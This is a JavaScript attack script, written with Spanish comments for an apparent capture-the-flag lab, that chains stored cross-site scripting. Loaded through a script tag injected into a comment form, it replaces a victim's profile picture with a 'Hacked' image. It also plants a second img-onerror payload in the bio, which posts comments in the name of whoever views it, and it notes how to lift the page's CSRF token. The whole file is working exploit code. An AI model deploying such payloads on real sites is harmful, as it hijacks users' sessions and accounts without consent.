// payload.js - XSS Chain para CTF: Actualiza pic/bio de Pepe con canvas "Hacked" + inyecta XSS2 para comentario de Jeni
// Uso: <script src="https://tu-username.github.io/tu-repo/payload.js"></script> en el form de comentario

// Crea canvas para imagen "Hacked"
var canvas = document.createElement('canvas');
canvas.width = 150;
canvas.height = 150;
var ctx = canvas.getContext('2d');
ctx.fillStyle = 'black';
ctx.fillRect(0, 0, 150, 150);
ctx.fillStyle = 'red';
ctx.font = 'bold 30px sans-serif';
ctx.fillText('Hacked', 20, 85);

// XSS2 para bio: POST comentario como Jeni (usa bypass <img> si <script> filtrado)
var xss2 = '<img src=x onerror="var fd = new FormData(); fd.append(\'comentario\', \'¡Hola HackLab! Soy jeni comentando desde biografías. #XSSChain\'); fetch(\'/comments\', {method: \'POST\', body: fd}).then(() => console.log(\'Comentario de Jeni enviado!\')); console.log(\'XSS2 ejecutado en bio!\');"> <p>Curiosidad + código = poder. Experto en Ciberseguridad. (Actualizado por hacklab)</p>';

// Convertir canvas a Blob y enviar update a /profile
canvas.toBlob(function(blob) {
  var formData = new FormData();
  formData.append('bio', xss2);
  formData.append('profile_pic', blob, 'hacked.jpg');
  // Si hay CSRF, agrega: formData.append('csrf_token', document.querySelector('input[name="csrf_token"]').value || '');
  fetch('/profile', {
    method: 'POST',
    body: formData
  }).then(r => {
    if (r.ok) {
      console.log('✅ Perfil de Pepe hackeado: Pic + Bio actualizados con XSS2');
    } else {
      console.error('❌ Error en POST a /profile:', r.status);
    }
  }).catch(err => console.error('Error en fetch:', err));
}, 'image/jpeg');
